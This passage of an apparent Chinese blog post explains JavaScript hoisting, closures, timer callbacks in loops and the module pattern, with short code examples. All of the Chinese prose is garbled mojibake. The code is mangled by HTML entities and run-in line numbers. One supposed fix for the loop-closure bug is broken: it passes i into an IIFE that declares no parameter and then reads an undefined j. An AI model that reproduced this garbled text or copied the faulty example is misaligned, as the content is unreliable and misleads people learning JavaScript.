å¼•æ“Žå¹¶ä¸ä¼šè¿™ä¹ˆè®¤ä¸ºï¼Œå®ƒå°† var a å’Œ a = 2å½“åšä¸¤ä¸ªå•ç‹¬çš„å£°æ˜Žï¼Œç¬¬ä¸€ä¸ªæ˜¯ç¼–è¯‘é˜¶æ®µçš„ä»»åŠ¡ï¼Œè€Œç¬¬äºŒä¸ªåˆ™æ˜¯æ‰§è¡Œé˜¶æ®µçš„ä»»åŠ¡ã€‚è¿™æ„å‘³ç€æ— è®ºä½œç”¨åŸŸä¸­çš„å£°æ˜Žå‡ºçŽ°åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Œéƒ½å°†åœ¨ä»£ç æœ¬èº«è¢«æ‰§è¡Œå‰é¦–å…ˆè¿›è¡Œå¤„ç†ã€‚å¯ä»¥å°†è¿™ä¸ªè¿‡ç¨‹å½¢è±¡åœ°æƒ³åƒæˆæ‰€æœ‰çš„å£°æ˜Žï¼ˆå˜é‡å’Œå‡½æ•°ï¼‰éƒ½ä¼šè¢«â€œç§»åŠ¨â€åˆ°å„è‡ªçš„ä½œç”¨åŸŸçš„æœ€é¡¶ç«¯ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºæå‡ã€‚ å£°æ˜Žæœ¬èº«ä¼šè¢«æå‡ï¼Œè€ŒåŒ…æ‹¬å‡½æ•°è¡¨è¾¾å¼çš„èµ‹å€¼åœ¨å†…çš„èµ‹å€¼æ“ä½œå¹¶ä¸ä¼šè¢«æå‡ã€‚è¦æ³¨æ„é¿å…é‡å¤å£°æ˜Žï¼Œç‰¹åˆ«æ˜¯å½“æ™®é€šçš„ var å£°æ˜Žå’Œ å‡½æ•°å£°æ˜Žæ··åœ¨ä¸€èµ·çš„æ—¶å€™ï¼Œå¦åˆ™ä¼šå¼•èµ·å¾ˆå¤šå±é™©ã€‚ ä½œç”¨åŸŸé—­åŒ…å¯ç¤ºé—­åŒ…æ˜¯åŸºäºŽè¯æ³•ä½œç”¨åŸŸä¹¦å†™ä»£ç æ‰€äº§ç”Ÿçš„è‡ªç„¶ç»“æžœï¼Œä½ ç”šè‡³ä¸éœ€è¦ä¸ºäº†åˆ©ç”¨å®ƒä»¬è€Œæœ‰æ„è¯†åœ°åˆ›å»ºé—­åŒ…ã€‚é—­åŒ…çš„åˆ›å»ºå’Œä½¿ç”¨åœ¨ä½ çš„ä»£ç ä¸­éšå¤„å¯è§ã€‚ å®žè´¨é—®é¢˜å½“å‡½æ•°å¯ä»¥è®°ä½å¹¶è®¿é—®æ‰€åœ¨è¯æ³•ä½œç”¨åŸŸæ—¶ï¼Œå°±äº§ç”Ÿäº†é—­åŒ…ï¼Œå³ä½¿å‡½æ•°æ˜¯åœ¨å½“å‰è¯æ³•ä½œç”¨åŸŸä¹‹å¤–æ‰§è¡Œã€‚ 12345678function foo()&#123; var a = 2; function bar()&#123; console.log(a); // 2 &#125; bar();&#125;foo(); åŸºäºŽè¯æ³•ä½œç”¨åŸŸçš„æŸ¥æ‰¾è§„åˆ™ï¼Œå‡½æ•° bar( ) å¯ä»¥è®¿é—®å¤–éƒ¨ä½œç”¨åŸŸä¸­çš„ å˜é‡a(è¿™ä¸ªä¾‹å­ä¸­æ˜¯ä¸€ä¸ª RHS å¼•ç”¨æŸ¥è¯¢) ä»ŽæŠ€æœ¯ä¸Šè®²ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªé—­åŒ…ã€‚ä½†æ ¹æ®å‰é¢çš„å®šä¹‰ï¼Œç¡®åˆ‡åœ°è¯´å¹¶ä¸æ˜¯ã€‚æœ€å‡†ç¡®åœ°ç”¨æ¥è§£é‡Š bar() å¯¹ a çš„å¼•ç”¨çš„æ–¹æ³•æ˜¯è¯æ³•ä½œç”¨åŸŸçš„æŸ¥æ‰¾è§„åˆ™ï¼Œè€Œè¿™äº›è§„åˆ™åªæ˜¯é—­åŒ…çš„ä¸€éƒ¨åˆ†ã€‚ ä»Žçº¯å­¦æœ¯è§’åº¦æ¥è®²ï¼Œåœ¨ä¸Šé¢çš„ä»£ç ç‰‡æ®µä¸­ï¼Œå‡½æ•° bar() å…·æœ‰ä¸€ä¸ªæ¶µç›– foo() ä½œç”¨åŸŸçš„é—­åŒ…ï¼ˆäº‹å®žä¸Šï¼Œæ¶µç›–äº†å®ƒèƒ½è®¿é—®çš„æ‰€æœ‰ä½œç”¨åŸŸï¼Œæ¯”å¦‚å…¨å±€ä½œç”¨åŸŸï¼‰ã€‚ä¹Ÿå¯ä»¥è®¤ä¸º bar() å°é—­åœ¨äº† foo() ä½œç”¨åŸŸä¸­ï¼Œå› ä¸º bar() åµŒå¥—åœ¨ foo() å†…éƒ¨ã€‚ ä½†æ˜¯é€šè¿‡è¿™ç§æ–¹å¼å®šä¹‰çš„é—­åŒ…ä¸èƒ½ç›´æŽ¥è¿›è¡Œè§‚å¯Ÿï¼Œä¹Ÿæ— æ³•æ˜Žç™½è¿™ä¸ªä»£ç ç‰‡æ®µä¸­é—­åŒ…æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°ç†è§£è¯æ³•ä½œç”¨åŸŸï¼Œè€Œé—­åŒ…åˆ™éšè—åœ¨ä»£ç ä¹‹åŽï¼Œæ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ç†è§£ã€‚æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 123456789function foo()&#123; var a = 2; function bar()&#123; console.log(a); &#125; return bar;&#125;var baz = foo();baz(); // 2 è¿™å°±æ˜¯é—­åŒ…çš„æ•ˆæžœ å‡½æ•° bar() çš„è¯æ³•ä½œç”¨åŸŸèƒ½å¤Ÿè®¿é—® foo() å†…éƒ¨ä½œç”¨åŸŸï¼Œç„¶åŽå°† bar() å‡½æ•°æœ¬èº«å½“åšä¸€ä¸ªå€¼ç±»åž‹è¿›è¡Œä¼ é€’ï¼Œå­—å•Šè¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°† bar æ‰€å¼•ç”¨çš„å‡½æ•°æœ¬èº«å½“åšè¿”å›žå€¼ã€‚åœ¨ foo() æ‰§è¡ŒåŽï¼Œå…¶è¿”å›žå€¼ï¼ˆä¹Ÿå°±æ˜¯å†…éƒ¨çš„bar()å‡½æ•°ï¼‰èµ‹å€¼ç»™å˜é‡ baz å¹¶è°ƒç”¨ baz()ï¼Œå®žé™…ä¸Šåªæ˜¯é€šè¿‡ä¸åŒçš„æ ‡è¯†ç¬¦å¼•ç”¨è°ƒç”¨äº†å†…éƒ¨çš„å‡½æ•° bar(); bar() æ˜¾ç„¶å¯ä»¥è¢«æ­£å¸¸æ‰§è¡Œã€‚ä½†æ˜¯è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒåœ¨è‡ªå·±å®šä¹‰çš„è¯æ³•ä½œç”¨åŸŸä»¥å¤–çš„åœ°æ–¹æ‰§è¡Œã€‚ åœ¨ foo æ‰§è¡ŒåŽï¼Œé€šå¸¸ä¼šæœŸå¾… foo çš„æ•´ä¸ªå†…éƒ¨ä½œç”¨åŸŸè¢«é”€æ¯ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“å¼•æ“Žæœ‰åžƒåœ¾å›žæ”¶å™¨ç”¨æ¥é‡Šæ”¾ä¸å†ä½¿ç”¨çš„å†…å­˜ç©ºé—´ã€‚ç”±äºŽçœ‹ä¸ŠåŽ» foo() çš„å†…å®¹ä¸ä¼šå†è¢«ä½¿ç”¨ï¼Œæ‰€ä»¥å¾ˆè‡ªç„¶è€Œç„¶åœ°ä¼šè€ƒè™‘å¯¹å…¶è¿›è¡Œå›žæ”¶ã€‚ è€Œé—­åŒ…çš„ç¥žå¥‡ä¹‹å¤„æ­£æ˜¯å¯ä»¥é˜»æ­¢è¿™ä¸ªäº‹æƒ…çš„å‘ç”Ÿã€‚äº‹å®žä¸Šå†…éƒ¨ä½œç”¨åŸŸä¾ç„¶å­˜åœ¨ï¼Œå› ä¸ºæ²¡æœ‰è¢«å›žæ”¶ã€‚bar()æœ¬èº«åœ¨ä½¿ç”¨è¿™ä¸ªä½œç”¨åŸŸã€‚ å› ä¸º bar() æ‰€å£°æ˜Žçš„ä½ç½®ï¼Œå®ƒæ‹¥æœ‰æ¶µç›– foo å†…éƒ¨ä½œç”¨åŸŸçš„é—­åŒ…ï¼Œä½¿å¾—è¯¥ä½œç”¨åŸŸèƒ½å¤Ÿä¸€ç›´å­˜æ´»ï¼Œä»¥ä¾› bar() åœ¨ä¹‹åŽä»»ä½•æ—¶é—´è¿›è¡Œå¼•ç”¨ã€‚bar() ä¾ç„¶æŒæœ‰å¯¹è¯¥ä½œç”¨åŸŸçš„å¼•ç”¨ï¼Œè€Œè¿™ä¸ªå¼•ç”¨å°±å«åšé—­åŒ…ã€‚ å› æ­¤ï¼Œåœ¨å‡ å¾®ç§’ä¹‹åŽå˜é‡ baz è¢«å®žé™…è°ƒç”¨ï¼ˆè°ƒç”¨å†…éƒ¨å‡½æ•° barï¼‰ï¼Œä¸å‡ºæ„å¤–å®ƒå¯ä»¥è®¿é—®å®šä¹‰æ—¶çš„è¯æ³•ä½œç”¨åŸŸï¼Œå› æ­¤å®ƒå¯ä»¥è®¿é—®å˜é‡ a. è¿™ä¸ªå‡½æ•°åœ¨å®šä¹‰æ—¶çš„è¯æ³•ä½œç”¨åŸŸä»¥å¤–çš„åœ°æ–¹è¢«è°ƒç”¨ã€‚é—­åŒ…ä½¿å¾—å‡½æ•°å¯ä»¥ç»§ç»­è®¿é—®å®šä¹‰æ—¶çš„è¯æ³•ä½œç”¨åŸŸã€‚å½“ç„¶æ— è®ºä½¿ç”¨ä½•ç§æ–¹å¼å¯¹å‡½æ•°ç±»åž‹çš„å€¼è¿›è¡Œä¼ é€’ï¼Œå½“å‡½æ•°åœ¨åˆ«å¤„è¢«è°ƒç”¨æ—¶éƒ½å¯ä»¥è§‚å¯Ÿåˆ°é—­åŒ… 123456789101112function foo()&#123; var a = 2; function baz()&#123; console.log(a); // 2 &#125; bar(baz)&#125;function bar(fn)&#123; fn(); //è¿™å°±æ˜¯é—­åŒ…&#125;foo();// æŠŠå†…éƒ¨å‡½æ•° baz ä¼ é€’ç»™ bar,å½“è°ƒç”¨è¿™ä¸ªå†…éƒ¨å‡½æ•°æ—¶ï¼ˆçŽ°åœ¨å«åš fnï¼‰,å®ƒæ¶µç›–çš„ foo() å†…éƒ¨ä½œç”¨åŸŸçš„é—­åŒ…å°±å¯ä»¥è§‚å¯Ÿåˆ°äº†ï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿè®¿é—® a ä¼ é€’å‡½æ•°å½“ç„¶ä¹Ÿå¯ä»¥æ˜¯é—´æŽ¥çš„ 12345678910111213var fn;function foo()&#123; var a = 2; function baz()&#123; console.log(a); &#125; fn = baz;// å°† baz åˆ†é…ç»™å…¨å±€å˜é‡&#125;function bar()&#123; fn(); // è¿™å°±æ˜¯é—­åŒ…&#125;foo();bar(); // 2 æ— è®ºé€šè¿‡ä½•ç§æ‰‹æ®µå°†å†…éƒ¨å‡½æ•°ä¼ é€’åˆ°æ‰€åœ¨çš„è¯æ³•ä½œç”¨åŸŸä»¥å¤–ï¼Œå®ƒéƒ½ä¼šä¿æŒå¯¹åŽŸå§‹å®šä¹‰ä½œç”¨åŸŸçš„å¼•ç”¨ï¼Œæ— è®ºåœ¨ä½•å¤„æ‰§è¡Œè¿™ä¸ªå‡½æ•°éƒ½ä¼šä½¿ç”¨é—­åŒ…ã€‚ çŽ°åœ¨æˆ‘æ‡‚äº†123456function wait(message)&#123; setTimeout(function timer()&#123; console.log(message); &#125;,1000);&#125;wait('Hello,closure!'); ä¸Šé¢ä»£ç ä¸­ï¼Œå°†ä¸€ä¸ªå†…éƒ¨å‡½æ•°ä¼ é€’ç»™ setTimeout(..)ã€‚timer å…·æœ‰æ¶µç›– wait(..)ä½œç”¨åŸŸçš„é—­åŒ…ï¼Œå› ä¸ºè¿˜ä¿æœ‰å¯¹å˜é‡ message çš„å¼•ç”¨ã€‚wait(..)æ‰§è¡Œ 1000æ¯«ç§’åŽï¼Œå®ƒçš„å†…éƒ¨ä½œç”¨åŸŸå¹¶ä¸ä¼šæ¶ˆå¤±ï¼Œtimer å‡½æ•°ä¾ç„¶ä¿æœ‰ wait(..)ä½œç”¨åŸŸçš„é—­åŒ…ã€‚åœ¨å¼•æ“Žå†…éƒ¨ï¼Œå†…ç½®çš„å·¥å…·å‡½æ•° setTimeout(..)æŒæœ‰å¯¹ä¸€ä¸ªå‚æ•°çš„å¼•ç”¨ï¼Œè¿™ä¸ªå‚æ•°ä¹Ÿè®¸å«åš fn æˆ–è€… func ï¼Œæˆ–è€…å…¶ä»–ç±»ä¼¼çš„åå­—ã€‚å¼•æ“Žä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œåœ¨ä¾‹å­ä¸­å°±æ˜¯å†…éƒ¨çš„ timer å‡½æ•°ï¼Œè€Œè¯æ³•ä½œç”¨åŸŸæ­£åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¿æŒå®Œæ•´ã€‚ è¿™å°±æ˜¯é—­åŒ…ã€‚ä¸‹é¢ç”¨jqå†™ä¸€ä¸ªä¾‹å­ 1234567function setupBot(name,selector)&#123; $(selector).click(function activator()&#123; console.log('Activating:' + name); &#125;);&#125;setupBot("Closure Bot1","#bot_1");setupBot("Closure Bot2","#bot_2"); æœ¬è´¨ä¸Šæ— è®ºä½•æ—¶ä½•åœ°ï¼Œå¦‚æžœå°†(è®¿é—®å®ƒä»¬å„è‡ªè¯æ³•ä½œç”¨åŸŸçš„)å‡½æ•°å½“åšç¬¬ä¸€çº§çš„å€¼ç±»åž‹å¹¶åˆ°å¤„ä¼ é€’ï¼Œå°±ä¼šçœ‹åˆ°é—­åŒ…åœ¨è¿™äº›å‡½æ•°ä¸­çš„åº”ç”¨ã€‚åœ¨å®šæ—¶å™¨ï¼Œäº‹ä»¶ç›‘å¬å™¨ï¼ŒAjaxè¯·æ±‚ï¼Œè·¨çª—å£é€šä¿¡ï¼ŒWeb Workers æˆ–è€…ä»»ä½•å…¶ä»–çš„å¼‚æ­¥ï¼ˆæˆ–è€…åŒæ­¥ï¼‰ä»»åŠ¡ä¸­ï¼Œåªè¦ä½¿ç”¨äº†å›žè°ƒå‡½æ•°ï¼Œå®žé™…ä¸Šå°±æ˜¯åœ¨ä½¿ç”¨é—­åŒ…ã€‚ ä¹‹å‰ä»‹ç»çš„ IIFE æ¨¡å¼ï¼Œé€šå¸¸è®¤ä¸º IIFEæ˜¯å…¸åž‹çš„é—­åŒ…ä¾‹å­ï¼Œä½†æ ¹æ®å…ˆå‰å¯¹é—­åŒ…çš„å®šä¹‰ï¼Œä½œè€…ä¸æ˜¯å¾ˆåŒæ„è¿™ä¸ªè§‚ç‚¹ 1234var a = 2;(function IIFE()&#123; console.log(a);&#125;)() è™½ç„¶è¿™æ®µä»£ç å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œä½†ä¸¥æ ¼æ¥è®²å¹¶ä¸æ˜¯é—­åŒ…ã€‚å› ä¸ºå‡½æ•°å¹¶ä¸æ˜¯åœ¨å®ƒæœ¬èº«çš„è¯æ³•ä½œç”¨åŸŸä»¥å¤–æ‰§è¡Œçš„ã€‚å®ƒåœ¨å®šä¹‰æ‰€åœ¨çš„ä½œç”¨åŸŸä¸­æ‰§è¡Œï¼ˆè€Œå¤–éƒ¨ä½œç”¨åŸŸï¼Œä¹Ÿå°±æ˜¯å…¨å±€ä½œç”¨åŸŸä¸­ä¹ŸæŒæœ‰ aï¼‰.a æ˜¯é€šè¿‡æ™®éçš„è¯æ³•ä½œç”¨åŸŸæŸ¥æ‰¾è€Œéžé—­åŒ…è¢«å‘çŽ°çš„ã€‚ å°½ç®¡ IIFE æœ¬èº«å¹¶ä¸æ˜¯è§‚å¯Ÿé—­åŒ…çš„æ°å½“ä¾‹å­ï¼Œä½†å®ƒçš„ç¡®åˆ›å»ºäº†é—­åŒ…ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯æœ€å¸¸è§ç”¨æ¥åˆ›å»ºå¯ä»¥è¢«å°é—­èµ·æ¥çš„é—­åŒ…çš„å·¥ä½œã€‚å› ä¸º IIFE çš„ç¡®åŒä½œç”¨åŸŸæ¯æ¯ç›¸å…³ï¼Œå³ä½¿æœ¬èº«å¹¶ä¸ä¼šçœŸçš„åˆ›å»ºä½œç”¨åŸŸã€‚ å¾ªçŽ¯å’Œé—­åŒ…è¯´æ˜Žé—­åŒ…ï¼Œfor å¾ªçŽ¯æ˜¯å¸¸è§çš„ä¾‹å­ 12345for(var i = 1; i &lt;= 5; i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i * 1000);&#125; ä¸Šé¢çš„ä»£ç ä¼šè¾“å‡ºäº”æ¬¡6ã€‚å»¶è¿Ÿå‡½æ•°çš„å›žè°ƒä¼šåœ¨å¾ªçŽ¯ç»“æŸæ—¶æ‰§è¡Œã€‚äº‹å®žä¸Šï¼Œå½“å®šæ—¶å™¨è¿è¡Œæ—¶å³ä½¿æ¯ä¸ªè¿­ä»£ä¸­æ‰§è¡Œçš„æ˜¯ setTimeout(â€¦,0)ï¼Œæ‰€æœ‰çš„å›žè°ƒå‡½æ•°ä¾ç„¶æ˜¯åœ¨å¾ªçŽ¯ç»“æŸåŽæ‰ä¼šè¢«æ‰§è¡Œï¼Œå› ä¸ºä¼šè¾“å‡ºä¸€ä¸ª6æ¥ã€‚ ä»£ç ä¸­è¿™ç§ç¼ºé™·å¯¼è‡´å®ƒçš„è¡Œä¸ºåŒè¯­ä¹‰æ‰€æš—ç¤ºçš„ä¸ä¸€æ ·ï¼Œè¿™ç§ç¼ºé™·æ˜¯æˆ‘ä»¬è¯•å›¾å‡è®¾å¾ªçŽ¯ä¸­çš„æ¯ä¸ªè¿­ä»£åœ¨è¿è¡Œæ—¶éƒ½ä¼šç»™è‡ªå·±â€œæ•èŽ·â€ä¸€ä¸ªiçš„å‰¯æœ¬ã€‚ä½†æ˜¯æ ¹æ®ä½œç”¨åŸŸçš„å·¥ä½œåŽŸç†ï¼Œå®žé™…æƒ…å†µæ˜¯å°½ç®¡å¾ªçŽ¯ä¸­çš„äº”ä¸ªå‡½æ•°æ˜¯åœ¨å„ä¸ªè¿­ä»£ä¸­åˆ†åˆ«å®šä¹‰çš„ï¼Œä½†æ˜¯å®ƒä»¬éƒ½è¢«å°é—­åœ¨ä¸€ä¸ªå…±äº«çš„å…¨å±€ä½œç”¨åŸŸä¸­ï¼Œå› ä¸ºå®žé™…ä¸Šåªæœ‰ä¸€ä¸ªiã€‚ è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å°±éœ€è¦æ›´å¤šé—­åŒ…ä½œç”¨åŸŸï¼Œç‰¹åˆ«æ˜¯åœ¨å¾ªçŽ¯çš„è¿‡ç¨‹ä¸­æ¯ä¸ªè¿­ä»£éƒ½éœ€è¦ä¸€ä¸ªé—­åŒ…ä½œç”¨åŸŸã€‚ 1234567891011121314151617181920212223242526for(var i = 1; i &lt;= 5; i++)&#123; (function()&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i *1000); &#125;)();&#125;// ä¸Šé¢ä»£ç ä¼šåœ¨5ç§’å†…è¾“å‡º5ä¸ª6.æ¯ä¸ªå»¶è¿Ÿå‡½æ•°éƒ½ä¼šå°† IIFE åœ¨æ¯æ¬¡è¿­ä»£ä¸­åˆ›å»ºçš„ä½œç”¨åŸŸå°é—­èµ·æ¥ã€‚ä½†æ˜¯è¿™ä¸ªä½œç”¨åŸŸæ˜¯ç©ºçš„ï¼Œéœ€è¦ä¼ å€¼è¿›åŽ»// æ–¹æ³•ä¸€for(var i = 1; i &lt;= 5; i++)&#123; (function()&#123; var j = i; setTimeout(function timer()&#123; console.log(j); &#125;,j *1000); &#125;)();&#125;// æ–¹æ³•äºŒfor(var i = 1; i &lt;= 5; i++)&#123; (function()&#123; setTimeout(function timer()&#123; console.log(j); &#125;,j *1000); &#125;)(i);&#125; åœ¨è¿­ä»£å†…ä½¿ç”¨IIFE ä¼šæ¯ä¸ªè¿­ä»£éƒ½ç”Ÿæˆä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œä½¿å¾—å»¶è¿Ÿå‡½æ•°çš„å›žè°ƒå°†æ–°çš„ä½œç”¨åŸŸå°é—­åœ¨æ¯ä¸ªè¿­ä»£å†…éƒ¨ï¼Œæ¯ä¸ªè¿­ä»£ä¸­éƒ½ä¼šå«æœ‰ä¸€ä¸ªå…·æœ‰æ­£ç¡®å€¼çš„å˜é‡ä¾›æˆ‘ä»¬è®¿é—®ã€‚ é‡è¿”å—ä½œç”¨åŸŸæˆ‘ä»¬ä½¿ç”¨ IIFE åœ¨æ¯æ¬¡è¿­ä»£æ—¶éƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„ä½œç”¨åŸŸï¼Œæ¢å¥è¯è¯´ï¼Œæ¯æ¬¡è¿­ä»£æˆ‘ä»¬éƒ½éœ€è¦ä¸€ä¸ªå—ä½œç”¨åŸŸã€‚ä¸Šé¢å°†è®²åˆ°äº† let å£°æ˜Žï¼Œå¯ä»¥ç”¨æ¥åŠ«æŒå—ä½œç”¨åŸŸï¼Œå¹¶ä¸”åœ¨è¿™ä¸ªå—ä½œç”¨åŸŸä¸­å£°æ˜Žä¸€ä¸ªå˜é‡ã€‚ æœ¬è´¨ä¸Šè¿™æ˜¯è®²ä¸€ä¸ªå—è½¬æ¢æˆä¸€ä¸ªå¯ä»¥è¢«å…³é—­çš„ä½œç”¨åŸŸï¼Œå¯ä»¥çœ‹çœ‹ä¸‹é¢çš„ä»£ç ï¼š 123456for(var i = 1; i &lt;= 5; i++)&#123; let j = i; // é—­åŒ…çš„ä½œç”¨åŸŸ setTimeout(function timer()&#123; console.log(j); &#125;,j * 1000);&#125; ä½†æ˜¯ï¼Œè¿™ä¸æ˜¯å…¨éƒ¨ï¼Œfor å¾ªçŽ¯å¤´éƒ¨çš„ let å£°æ˜Žè¿˜ä¼šæœ‰ä¸€ä¸ªç‰¹æ®Šçš„è¡Œä¸ºï¼Œè¿™ä¸ªè¡Œä¸ºæŒ‡å‡ºçš„å˜é‡åœ¨å¾ªçŽ¯çš„è¿‡ç¨‹ä¸­ä¸æ­¢è¢«å£°æ˜Žä¸€æ¬¡ï¼Œæ¯æ¬¡è¿­ä»£éƒ½ä¼šå£°æ˜Žï¼ŒéšåŽçš„è¿­ä»£éƒ½ä¼šä½¿ç”¨ä¸Šä¸€ä¸ªè¿­ä»£ç»“æŸæ—¶çš„å€¼æ¥åˆå§‹åŒ–è¿™ä¸ªå˜é‡ã€‚ 12345for(let i = 1; i &lt;= 5; i++)&#123; setTimeout(function timer()&#123; console.log(i); &#125;,i * 1000);&#125; æ¨¡å—è¿˜æœ‰å…¶ä»–çš„ä»£ç æ¨¡å¼åˆ©ç”¨é—­åŒ…çš„å¼ºå¤§å¨åŠ›ï¼Œä½†ä»Žè¡¨é¢çœ‹ï¼Œå®ƒä»¬ä¼¼ä¹Žä¸Žå›žè°ƒæ— å…³ï¼Œå…¶ä¸­æœ€å¼ºå¤§çš„ä¸€ä¸ªï¼šæ¨¡å— 12345678910function foo()&#123; var something = 'cool'; var another = [1,2,3]; function doSomething()&#123; console.log(something); &#125; function doAnother()&#123; console.log(another.join("!")); &#125;&#125; æ­£å¦‚è¿™æ®µä»£ç ä¸­çœ‹åˆ°çš„ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰æ˜Žæ˜¾çš„é—­åŒ…ï¼Œåªæœ‰ä¸¤ä¸ªç§æœ‰æ•°æ®å˜é‡ something å’Œ anotherï¼Œä»¥åŠ doSomethingï¼ˆï¼‰ å’Œ doAnotherï¼ˆï¼‰ä¸¤ä¸ªå†…éƒ¨å‡½æ•°ï¼Œå®ƒä»¬çš„è¯æ³•ä½œç”¨åŸŸï¼ˆè€Œè¿™å°±æ˜¯é—­åŒ…ï¼‰ä¹Ÿå°±æ˜¯ foo å†…éƒ¨ä½œç”¨åŸŸã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345678910111213141516function CoolModule()&#123; var something = 'cool'; var another = [1,2,3]; function doSomething()&#123; console.log(something); &#125; function doAnother()&#123; console.log(another.join("!")); &#125; return &#123; doSomething,doAnother &#125;&#125;var foo = CoolModule();foo.doSomething(); // coolfoo.doAnother(); // 1!2!3 è¿™ä¸ªæ¨¡å¼åœ¨ JavaScript ä¸­è¢«ç§°ä¸ºæ¨¡å—ï¼Œèƒ½å¸¸è§çš„å®žçŽ°æ¨¡å—æ¨¡å¼çš„æ–¹æ³•é€šå¸¸è¢«ç§°ä¸ºæ¨¡å—åŒ…æ¥¼ã€‚ é¦–å…ˆï¼ŒCoolModule() åªæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå¿…é¡»è¦é€šè¿‡è°ƒç”¨å®ƒæ¥åˆ›å»ºä¸€ä¸ªæ¨¡å—å®žä¾‹ï¼Œå¦‚æžœä¸æ‰§è¡Œå†…éƒ¨å‡½æ•°ï¼Œå†…éƒ¨ä½œç”¨åŸŸå’Œé—­åŒ…éƒ½æ— æ³•è¢«åˆ›å»ºã€‚ å…¶æ¬¡ï¼ŒCoolModule() åªè¿”å›žä¸€ä¸ªç”¨å¯¹è±¡å­—é¢é‡è¯­æ³•{key:valueâ€¦}æ¥è¡¨ç¤ºçš„å¯¹è±¡ã€‚è¿™ä¸ªè¿”å›žçš„å¯¹è±¡ä¸­å«æœ‰å¯¹å†…éƒ¨å‡½æ•°è€Œä¸æ˜¯å†…éƒ¨æ•°æ®å˜é‡çš„å¼•ç”¨ã€‚æˆ‘ä»¬ä¿æŒå†…éƒ¨æ•°æ®å˜é‡æ˜¯éšè—ä¸”ç§æœ‰çš„çŠ¶æ€ï¼Œå¯ä»¥å°†è¿™è¿™ä¸ªå¯¹è±¡ç±»åž‹çš„è¿”å›žå€¼çœ‹ä½œæ˜¯æœ¬è´¨ä¸Šæ˜¯æ¨¡å—çš„å…¬å…± API è¿™ä¸ªå¯¹è±¡ç±»åž‹çš„è¿”å›žå€¼æœ€ç»ˆè¢«èµ‹å€¼ç»™å¤–éƒ¨çš„å˜é‡ foo ï¼Œç„¶åŽå°±å¯ä»¥é€šè¿‡å®ƒæ¥è®¿é—® API ä¸­çš„å±žæ€§æ–¹æ³•ï¼Œæ¯”å¦‚ foo.doSomething(); ä»Žæ¨¡å—ä¸­è¿”å›žä¸€ä¸ªå®žé™…çš„å¯¹è±¡ä¸æ˜¯å¿…é¡»çš„ï¼Œä¹Ÿæ˜¯å¯ä»¥ç›´æŽ¥è¿”å›žä¸€ä¸ªå†…éƒ¨å‡½æ•°ã€‚JQ å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚JQ å’Œ $ æ ‡è¯†ç¬¦å°±æ˜¯ JQ æ¨¡å—çš„å…¬å…± API ï¼Œä½†å®ƒä»¬æœ¬èº«éƒ½æ˜¯å‡½æ•°ï¼ˆç”±äºŽå‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå®ƒä»¬æœ¬èº«ä¹Ÿå¯ä»¥æ‹¥æœ‰å±žæ€§ï¼‰ doSomething å’Œ doAnother å‡½æ•°å…·æœ‰æ¶µç›–æ¨¡å—å®žåŠ›å†…éƒ¨ä½œç”¨åŸŸçš„é—­åŒ…ï¼ˆé€šè¿‡è°ƒç”¨ CoolModule å®žçŽ°ï¼‰ã€‚å½“é€šè¿‡è¿”å›žä¸€ä¸ªå«æœ‰å±žæ€§å¼•ç”¨çš„å¯¹è±¡çš„æ–¹å¼æ¥å°†å‡½æ•°ä¼ é€’åˆ°è¯æ³•ä½œç”¨åŸŸå¤–éƒ¨æ—¶ã€‚æˆ‘ä»¬å°±å·²ç»åˆ›å»ºäº†å¯ä»¥è§‚å¯Ÿå’Œå®žè·µçš„é—­åŒ…çš„æ¡ä»¶äº†ã€‚ æ¨¡å—æ¨¡å¼éœ€è¦å…·å¤‡ä¸¤ä¸ªæ¡ä»¶ï¼š å¿…é¡»æœ‰å¤–éƒ¨åˆ†å°é—­å‡½æ•°ï¼Œæ”¹å‡½æ•°å¿…é¡»è‡³å°‘è¢«è°ƒç”¨ä¸€æ¬¡ï¼ˆæ¯æ¬¡è°ƒç”¨ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ¨¡å—å®žä¾‹ï¼‰ å°é—­å‡½æ•°å¿…é¡»è¿”å›žè‡³å°‘ä¸€ä¸ªå†…éƒ¨å‡½æ•°ï¼Œè¿™æ ·å†…éƒ¨å‡½æ•°æ‰èƒ½åœ¨ç§æœ‰çš„ä½œç”¨åŸŸä¸­å½¢æˆé—­åŒ…ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®æˆ–è€…ä¿®æ”¹ç§æœ‰çš„çŠ¶æ€ã€‚ ä¸€ä¸ªå…·æœ‰å‡½æ•°å±žæ€§çš„å¯¹è±¡æœ¬èº«å¹¶ä¸æ˜¯çœŸæ­£çš„æ¨¡å—ã€‚ä»Žæ–¹ä¾¿è§‚å¯Ÿçš„è§’åº¦çœ‹ï¼Œä¸€ä¸ªä»Žå‡½æ•°è°ƒç”¨æ‰€è¿”å›žçš„ï¼Œåªæœ‰æ•°æ®å±žæ€§è€Œæ²¡æœ‰é—­åŒ…å‡½æ•°çš„å¯¹è±¡å¹¶ä¸æ˜¯çœŸæ­£çš„æ¨¡å—ã€‚ ä¸Šé¢çš„å®žä¾‹ä»£ç éƒ½æœ‰ä¸€ä¸ªå«åš CoolModule 